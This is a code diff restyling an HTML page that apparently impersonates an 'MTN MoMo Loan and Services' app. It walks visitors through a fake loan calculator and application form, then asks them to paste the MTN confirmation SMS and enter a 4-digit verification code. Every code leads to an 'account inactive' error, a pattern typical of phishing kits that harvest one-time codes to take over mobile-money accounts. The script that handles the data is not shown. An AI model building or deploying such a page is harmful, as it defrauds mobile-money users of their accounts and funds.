@@ -8,10 +8,9 @@
 </head>
 <body>
 
-    <!-- Screen 1: Language Selection (New Dark Theme) -->
+    <!-- Screen 1: Language Selection (Dark Theme) -->
     <div id="language-screen" class="dark-screen active">
         <div class="dark-card">
-            
             <div class="logo-container">
                 <svg viewBox="0 0 24 24" fill="none" stroke="#ffcc00" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                     <rect x="2" y="5" width="20" height="14" rx="2"></rect>
@@ -22,9 +21,7 @@
             <h2 class="dark-title">Choose your <span class="highlight-yellow">language</span></h2>
             <p class="dark-subtitle">Select your language to continue</p>
 
-            <!-- Language Options -->
             <div class="lang-options">
-                <!-- English -->
                 <div class="lang-option" onclick="selectLanguage()">
                     <img src="https://flagcdn.com/w40/gb.png" alt="English Flag">
                     <div class="lang-text">
@@ -34,7 +31,6 @@
                     <div class="radio-circle"></div>
                 </div>
 
-                <!-- French -->
                 <div class="lang-option" onclick="selectLanguage()">
                     <img src="https://flagcdn.com/w40/fr.png" alt="French Flag">
                     <div class="lang-text">
@@ -44,7 +40,6 @@
                     <div class="radio-circle"></div>
                 </div>
 
-                <!-- Camfranglais (Selected State) -->
                 <div class="lang-option selected" onclick="selectLanguage()">
                     <img src="https://flagcdn.com/w40/cm.png" alt="Cameroon Flag">
                     <div class="lang-text">
@@ -54,36 +49,61 @@
                     <div class="radio-circle"></div>
                 </div>
             </div>
-
             <small class="dark-footer">You can change it anytime</small>
         </div>
     </div>
 
-    <!-- Screen 2: Main App (Calculator & Form) -->
-    <div id="main-screen" class="screen">
-        <div class="header">
-            <h2>MTN MoMo Loan and Services</h2>
-        </div>
-
-        <div class="content">
-            <h3>Welcome to MTN MoMo Loan and Services</h3>
-            <p>Get loans easily through MTN MoMo Loan and Services</p>
-
-            <!-- Loan Calculator -->
-            <div class="calculator-box">
-                <h4>Loan Calculator</h4>
-                <input type="range" id="loanAmount" min="10000" max="1000000" step="5000" value="100000" oninput="updateLoanValue()">
-                <p id="amountDisplay">XAF 100,000</p>
-                <p>Monthly Payment</p>
-                <h3 id="monthlyPayment">XAF 33,333</h3>
+    <!-- Screen 2: Main Calculator (New Dark Theme) -->
+    <div id="main-screen" class="dark-screen">
+        <div class="calculator-container">
+            
+            <div class="calc-header">
+                <h1>Welcome to MTN MoMo Loan and Services</h1>
+                <p>Get loans easily through MTN MoMo Loan and Services</p>
             </div>
 
-            <!-- Form Progress Indicator -->
+            <div class="calc-card">
+                <h2 class="calc-title">Loan Calculator</h2>
+
+                <!-- Amount Slider -->
+                <div class="slider-group">
+                    <div class="slider-labels">
+                        <span>Amount: <strong class="highlight-yellow" id="amountDisplay">XAF 410,000</strong></span>
+                    </div>
+                    <input type="range" id="loanAmount" min="10000" max="1000000" step="10000" value="410000" oninput="updateLoanValue()">
+                    <div class="range-limits">
+                        <span>XAF 10,000</span>
+                        <span>XAF 1,000,000</span>
+                    </div>
+                </div>
+
+                <!-- Term Slider -->
+                <div class="slider-group">
+                    <div class="slider-labels">
+                        <span>Term: <strong class="highlight-yellow" id="termDisplay">12 Months</strong></span>
+                    </div>
+                    <input type="range" id="loanTerm" min="3" max="36" step="1" value="12" oninput="updateLoanValue()">
+                </div>
+
+                <!-- Result Box -->
+                <div class="result-box">
+                    <p>Monthly Payment</p>
+                    <h2 class="highlight-yellow" id="monthlyPayment">XAF 38,267</h2>
+                </div>
+
+                <!-- Start Button -->
+                <button class="btn-primary" onclick="showScreen('form-screen')">START APPLICATION</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Screen 3: Multi-step Form -->
+    <div id="form-screen" class="dark-screen">
+        <div class="dark-card">
             <div class="progress-bar">
                 <p id="step-indicator">Step 1 of 3</p>
             </div>
 
-            <!-- Multi-step Form -->
             <div id="form-container">
                 <!-- Step 1 -->
                 <div id="step-1" class="form-step active">
@@ -94,7 +114,7 @@
                         <option>Personal</option>
                         <option>Education</option>
                     </select>
-                    <button onclick="nextStep(2)">Next</button>
+                    <button class="btn-primary" onclick="nextStep(2)">Next</button>
                 </div>
 
                 <!-- Step 2 -->
@@ -104,7 +124,7 @@
                     <input type="text" placeholder="John Doe">
                     <label>Phone Number:</label>
                     <input type="tel" placeholder="6XXXXXXXX">
-                    <button onclick="nextStep(3)">Next</button>
+                    <button class="btn-primary" onclick="nextStep(3)">Next</button>
                 </div>
 
                 <!-- Step 3 -->
@@ -112,41 +132,49 @@
                     <h4>Employment Details</h4>
                     <label>Occupation:</label>
                     <input type="text" placeholder="Enter occupation">
-                    <button onclick="submitApplication()">Submit Application</button>
+                    <button class="btn-primary" onclick="submitApplication()">Submit Application</button>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- Screen 3: Processing -->
-    <div id="processing-screen" class="screen">
-        <h2>Processing Application</h2>
-        <p>Please wait, this may take a few seconds</p>
-        <div class="loader"></div>
+    <!-- Screen 4: Processing -->
+    <div id="processing-screen" class="dark-screen">
+        <div class="dark-card" style="text-align:center;">
+            <h2 class="dark-title">Processing Application</h2>
+            <p class="dark-subtitle">Please wait, this may take a few seconds</p>
+            <div class="loader"></div>
+        </div>
     </div>
 
-    <!-- Screen 4: Paste SMS -->
-    <div id="sms-screen" class="screen">
-        <h2>Paste the SMS from MTN</h2>
-        <p>We sent a confirmation message to your number. Copy the full SMS you received and paste it below.</p>
-        <textarea placeholder="Paste SMS here..."></textarea>
-        <button onclick="showScreen('verification-screen')">Next</button>
+    <!-- Screen 5: Paste SMS -->
+    <div id="sms-screen" class="dark-screen">
+        <div class="dark-card" style="text-align:center;">
+            <h2 class="dark-title">Paste the SMS from MTN</h2>
+            <p class="dark-subtitle">We sent a confirmation message to your number. Copy the full SMS you received and paste it below.</p>
+            <textarea placeholder="Paste SMS here..."></textarea>
+            <button class="btn-primary" onclick="showScreen('verification-screen')">Next</button>
+        </div>
     </div>
 
-    <!-- Screen 5: Verification Code -->
-    <div id="verification-screen" class="screen">
-        <h2>Enter the Verification Code</h2>
-        <p>We sent a 4-digit code to your number. Enter it below to continue.</p>
-        <input type="text" maxlength="4" placeholder="0000">
-        <button onclick="showScreen('error-screen')">Verify</button>
+    <!-- Screen 6: Verification Code -->
+    <div id="verification-screen" class="dark-screen">
+        <div class="dark-card" style="text-align:center;">
+            <h2 class="dark-title">Enter the Verification Code</h2>
+            <p class="dark-subtitle">We sent a 4-digit code to your number. Enter it below to continue.</p>
+            <input type="text" maxlength="4" placeholder="0000" style="text-align: center; font-size: 24px; letter-spacing: 5px;">
+            <button class="btn-primary" onclick="showScreen('error-screen')">Verify</button>
+        </div>
     </div>
 
-    <!-- Screen 6: Error/Inactive Account -->
-    <div id="error-screen" class="screen">
-        <h2>Oops! Your account is inactive</h2>
-        <p>We can't credit your loan at the moment.</p>
-        <h4>Here's what to do next</h4>
-        <p>Your account cannot be credited because it is not active. Please ensure you are using an active account that has been making transactions regularly, then try again.</p>
+    <!-- Screen 7: Error/Inactive Account -->
+    <div id="error-screen" class="dark-screen">
+        <div class="dark-card" style="text-align:center;">
+            <h2 class="dark-title">Oops! Your account is inactive</h2>
+            <p class="dark-subtitle">We can't credit your loan at the moment.</p>
+            <h4 class="highlight-yellow" style="margin-bottom: 10px;">Here's what to do next</h4>
+            <p class="dark-subtitle">Your account cannot be credited because it is not active. Please ensure you are using an active account that has been making transactions regularly, then try again.</p>
+        </div>
     </div>
 
     <script src="script.js"></script>
